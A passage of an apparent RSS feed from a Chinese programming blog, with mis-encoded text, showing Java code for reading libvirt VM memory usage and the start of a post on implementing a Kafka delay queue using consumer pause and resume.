&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Optional&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;MemoryStatistic&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; first &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Arrays.&lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt;(memoryStatistics).&lt;span style=&#34;color:#a6e22e&#34;&gt;filter&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; x.&lt;span style=&#34;color:#a6e22e&#34;&gt;getTag&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 8).&lt;span style=&#34;color:#a6e22e&#34;&gt;findFirst&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (first.&lt;span style=&#34;color:#a6e22e&#34;&gt;isPresent&lt;/span&gt;()) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  MemoryStatistic memoryStatistic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; first.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; unusedMemory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; memoryStatistic.&lt;span style=&#34;color:#a6e22e&#34;&gt;getValue&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; maxMemory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; domain.&lt;span style=&#34;color:#a6e22e&#34;&gt;getMaxMemory&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; memoryUsage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (maxMemory &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; unusedMemory) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; 100.&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; maxMemory;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  log.&lt;span style=&#34;color:#a6e22e&#34;&gt;debug&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;è™šæ‹Ÿæœº[{}]å†…å­˜ä½¿ç”¨ç‡ä¸º: {}&amp;#34;&lt;/span&gt;, uuid, memoryUsage);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ç½‘å¡æ•°æ®åŒ…ä¿¡æ¯&#34;&gt;ç½‘å¡æ•°æ®åŒ…ä¿¡æ¯&lt;/h3&gt;
&lt;p&gt;åŒæ ·&lt;code&gt;libvirt&lt;/code&gt;å¹¶æ²¡æœ‰æä¾›è·å–è™šæ‹Ÿæœºç½‘å¡çš„æ¥å£ï¼Œå› æ­¤éœ€è¦è·å–è™šæ‹Ÿæœºçš„xmlæ–‡ä»¶æ¥æŸ¥è¯¢ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>åŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ—</title>
      <link>https://www.typesafe.cn/posts/kafka-delay-queue/</link>
      <pubDate>Sun, 18 Apr 2021 00:08:38 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/kafka-delay-queue/</guid>
      <description>&lt;h1 id=&#34;åŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ—&#34;&gt;åŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ—&lt;/h1&gt;
&lt;p&gt;kafkaä½œä¸ºä¸€ä¸ªä½¿ç”¨å¹¿æ³›çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¾ˆå¤šäººéƒ½ä¸ä¼šé™Œç”Ÿï¼Œä½†å½“ä½ åœ¨ç½‘ä¸Šæœç´¢â€œkafka å»¶è¿Ÿé˜Ÿåˆ—â€ï¼Œå‡ºç°çš„éƒ½æ˜¯ä¸€äº›è®²è§£æ—¶é—´è½®æˆ–è€…åªæ˜¯æä¾›äº†ä¸€äº›æ€è·¯ï¼Œå¹¶æ²¡æœ‰ä¸€ä»½çœŸå®å¯ç”¨çš„ä»£ç å®ç°ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ‰“ç ´è¿™ä¸ªç°è±¡ï¼Œæä¾›ä¸€ä»½å¯è¿è¡Œçš„ä»£ç ï¼ŒæŠ›ç –å¼•ç‰ï¼Œå¸å¼•æ›´å¤šçš„å¤§ç¥æ¥åˆ†äº«ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åŸºäºkafkaå¦‚ä½•å®ç°å»¶è¿Ÿé˜Ÿåˆ—&#34;&gt;åŸºäºkafkaå¦‚ä½•å®ç°å»¶è¿Ÿé˜Ÿåˆ—ï¼Ÿ&lt;/h3&gt;
&lt;p&gt;æƒ³è¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ†è§£é—®é¢˜ã€‚kafkaä½œä¸ºä¸€ä¸ªé«˜æ€§èƒ½çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œåªè¦æ¶ˆè´¹èƒ½åŠ›è¶³å¤Ÿï¼Œå‘å‡ºçš„æ¶ˆæ¯éƒ½æ˜¯ä¼šç«‹åˆ»æ”¶åˆ°çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³ä¸€ä¸ªåŠæ³•ï¼Œè®©æ¶ˆæ¯å»¶è¿Ÿå‘é€å‡ºå»ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ä¸Šå·²ç»æœ‰å¤§ç¥ç»™å‡ºäº†å¦‚ä¸‹æ–¹æ¡ˆï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åœ¨å‘é€å»¶è¿Ÿæ¶ˆæ¯æ—¶ä¸ç›´æ¥å‘é€åˆ°ç›®æ ‡topicï¼Œè€Œæ˜¯å‘é€åˆ°ä¸€ä¸ªç”¨äºå¤„ç†å»¶è¿Ÿæ¶ˆæ¯çš„topicï¼Œä¾‹å¦‚&lt;code&gt;delay-minutes-1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;å†™ä¸€æ®µä»£ç æ‹‰å–&lt;code&gt;delay-minutes-1&lt;/code&gt;ä¸­çš„æ¶ˆæ¯ï¼Œå°†æ»¡è¶³æ¡ä»¶çš„æ¶ˆæ¯å‘é€åˆ°çœŸæ­£çš„ç›®æ ‡ä¸»é¢˜é‡Œã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å°±åƒç”»ä¸€åŒ¹é©¬ä¸€æ ·ç®€å•ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;æ€æ ·ç”»é©¬&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/uPic/%E6%80%8E%E6%A0%B7%E7%94%BB%E9%A9%AC.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ–¹æ¡ˆæ˜¯å¥½çš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦æ›´å¤šç»†èŠ‚ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å®Œå–„ç»†èŠ‚&#34;&gt;å®Œå–„ç»†èŠ‚&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼Ÿ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é—®é¢˜å‡ºåœ¨å»¶è¿Ÿæ¶ˆæ¯å‘å‡ºå»ä¹‹åï¼Œä»£ç ç¨‹åºå°±ä¼šç«‹åˆ»æ”¶åˆ°å»¶è¿Ÿæ¶ˆæ¯ï¼Œè¦å¦‚ä½•å¤„ç†æ‰èƒ½è®©å»¶è¿Ÿæ¶ˆæ¯ç­‰å¾…ä¸€æ®µæ—¶é—´æ‰å‘é€åˆ°çœŸæ­£çš„topicé‡Œé¢ã€‚&lt;/p&gt;
&lt;p&gt;å¯èƒ½æœ‰åŒå­¦ä¼šè§‰å¾—å¾ˆç®€å•å˜›ï¼Œåœ¨ä»£ç ç¨‹åºæ”¶åˆ°æ¶ˆæ¯ä¹‹ååˆ¤æ–­æ¡ä»¶ä¸æ»¡è¶³ï¼Œå°±è°ƒç”¨&lt;code&gt;sleep&lt;/code&gt;æ–¹æ³•ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´æˆ‘å†è¿›è¡Œä¸‹ä¸€ä¸ªå¾ªç¯æ‹‰å–æ¶ˆæ¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;çœŸçš„å¯è¡Œå—?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸€åˆ‡å¥½åƒéƒ½å¾ˆç¾å¥½ï¼Œä½†è¿™æ˜¯ä¸å¯è¡Œçš„ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯å› ä¸ºåœ¨è½®è¯¢kafkaæ‹‰å–æ¶ˆæ¯çš„æ—¶å€™ï¼Œå®ƒä¼šè¿”å›ç”±&lt;code&gt;max.poll.records&lt;/code&gt;é…ç½®æŒ‡å®šçš„ä¸€æ‰¹æ¶ˆæ¯ï¼Œä½†æ˜¯å½“ç¨‹åºä»£ç ä¸èƒ½åœ¨&lt;code&gt;max.poll.interval.ms&lt;/code&gt;é…ç½®çš„æœŸæœ›æ—¶é—´å†…å¤„ç†è¿™äº›æ¶ˆæ¯çš„è¯ï¼Œkafkaå°±ä¼šè®¤ä¸ºè¿™ä¸ªæ¶ˆè´¹è€…å·²ç»æŒ‚äº†ï¼Œä¼šè¿›è¡Œ&lt;code&gt;rebalance&lt;/code&gt;ï¼ŒåŒæ—¶ä½ è¿™ä¸ªæ¶ˆè´¹è€…å°±æ— æ³•å†æ‹‰å–åˆ°ä»»ä½•æ¶ˆæ¯äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¾ä¸ªä¾‹å­ï¼šå½“ä½ éœ€è¦ä¸€ä¸ª24å°æ—¶çš„å»¶è¿Ÿæ¶ˆæ¯é˜Ÿåˆ—ï¼Œåœ¨ä»£ç é‡Œé¢å†™ä¸‹äº†&lt;code&gt;Thread.sleep(1000*60*60*24);&lt;/code&gt;ï¼Œä¸ºäº†ä¸å‘ç”Ÿ&lt;code&gt;rebalance&lt;/code&gt;ï¼Œä½ æŠŠ&lt;code&gt;max.poll.interval.ms&lt;/code&gt; ä¹Ÿæ”¹æˆäº†&lt;code&gt;1000*60*60*24&lt;/code&gt;ï¼Œè¿™ä¸ªæ—¶å€™ä½ æˆ–è®¸ä¼šæ„Ÿè§‰åˆ°ä¸€ä¸ä¸çš„æ€ªå¼‚ï¼Œæˆ‘æ˜¯è°ï¼Ÿæˆ‘åœ¨å“ªï¼Ÿæˆ‘ä¸ºä»€ä¹ˆè¦å†™å‡ºæ¥è¿™æ ·çš„ä»£ç ï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å…¶å®æˆ‘ä»¬å¯ä»¥æ›´ä¼˜é›…çš„å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;KafkaConsumer æä¾›äº†æš‚åœå’Œæ¢å¤çš„APIå‡½æ•°ï¼Œè°ƒç”¨æ¶ˆè´¹è€…çš„æš‚åœæ–¹æ³•åå°±æ— æ³•å†æ‹‰å–åˆ°æ–°çš„æ¶ˆæ¯ï¼ŒåŒæ—¶é•¿æ—¶é—´ä¸æ¶ˆè´¹kafkaä¹Ÿä¸ä¼šè®¤ä¸ºè¿™ä¸ªæ¶ˆè´¹è€…å·²ç»æŒ‚æ‰äº†ã€‚å¦å¤–ä¸ºäº†èƒ½å¤Ÿæ›´åŠ ä¼˜é›…ï¼Œæˆ‘ä»¬ä¼šå¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨æ¥æ›¿æ¢&lt;code&gt;sleep&lt;/code&gt;ã€‚ï¼Œå®Œæ•´æµç¨‹å¦‚ä¸‹å›¾ï¼Œå½“æ¶ˆè´¹è€…å‘ç°æ¶ˆæ¯ä¸æ»¡è¶³æ¡ä»¶æ—¶ï¼Œæˆ‘ä»¬å°±æš‚åœæ¶ˆè´¹è€…ï¼Œå¹¶æŠŠåç§»é‡seekåˆ°ä¸Šä¸€æ¬¡æ¶ˆè´¹çš„ä½ç½®ä»¥ä¾¿ç­‰å¾…ä¸‹ä¸€ä¸ªå‘¨æœŸå†æ¬¡æ¶ˆè´¹è¿™æ¡æ¶ˆæ¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;kafka-delay-queue&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/uPic/kafka-delay-queue.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;javaä»£ç å®ç°&#34;&gt;Javaä»£ç å®ç°&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; com.fasterxml.jackson.core.JsonProcessingException;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; com.fasterxml.jackson.databind.JsonNode;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; com.fasterxml.jackson.databind.ObjectMapper;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.kafka.clients.consumer.*;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.kafka.clients.producer.KafkaProducer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.kafka.clients.producer.ProducerConfig;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.kafka.clients.producer.ProducerRecord;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.kafka.common.TopicPartition;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.kafka.common.serialization.StringDeserializer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.kafka.common.serialization.StringSerializer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.junit.jupiter.api.BeforeEach;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.junit.jupiter.api.Test;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.springframework.boot.test.context.SpringBootTest;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.time.Duration;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.*;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.concurrent.ExecutionException;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@SpringBootTest&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DelayQueueTest&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; KafkaConsumer&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;String, String&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; consumer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; KafkaProducer&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;String, String&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; producer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; Boolean exit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; Object lock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Object();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String servers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;@BeforeEach&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;initConsumer&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Properties props &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Properties();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        props.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(ConsumerConfig.&lt;span style=&#34;color:#a6e22e&#34;&gt;BOOTSTRAP_SERVERS_CONFIG&lt;/span&gt;, servers);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        props.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(ConsumerConfig.&lt;span style=&#34;color:#a6e22e&#34;&gt;GROUP_ID_CONFIG&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        props.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(ConsumerConfig.&lt;span style=&#34;color:#a6e22e&#34;&gt;ENABLE_AUTO_COMMIT_CONFIG&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;false&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        props.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(ConsumerConfig.&lt;span style=&#34;color:#a6e22e&#34;&gt;AUTO_OFFSET_RESET_CONFIG&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;earliest&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        props.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(ConsumerConfig.&lt;span style=&#34;color:#a6e22e&#34;&gt;ISOLATION_LEVEL_CONFIG&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;read_committed&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        props.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(ConsumerConfig.&lt;span style=&#34;color:#a6e22e&#34;&gt;MAX_POLL_INTERVAL_MS_CONFIG&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5000&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        consumer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; KafkaConsumer&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;(props, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringDeserializer(), &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringDeserializer());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;@BeforeEach&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;initProducer&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Properties props &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Properties();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        props.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(ProducerConfig.&lt;span style=&#34;color:#a6e22e&#34;&gt;BOOTSTRAP_SERVERS_CONFIG&lt;/span&gt;, servers);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        props.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(ProducerConfig.&lt;span style=&#34;color:#a6e22e&#34;&gt;VALUE_SERIALIZER_CLASS_CONFIG&lt;/span&gt;, StringSerializer.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getName&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        props.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(ProducerConfig.&lt;span style=&#34;color:#a6e22e&#34;&gt;KEY_SERIALIZER_CLASS_CONFIG&lt;/span&gt;, StringSerializer.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getName&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        producer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; KafkaProducer&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;(props);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;@Test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testDelayQueue&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; JsonProcessingException, InterruptedException {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        String topic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;delay-minutes-1&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        List&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;String&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; topics &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Collections.&lt;span style=&#34;color:#a6e22e&#34;&gt;singletonList&lt;/span&gt;(topic);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        consumer.&lt;span style=&#34;color:#a6e22e&#34;&gt;subscribe&lt;/span&gt;(topics);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Timer timer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Timer();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        timer.&lt;span style=&#34;color:#a6e22e&#34;&gt;schedule&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; TimerTask() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;@Override&lt;/span&gt;
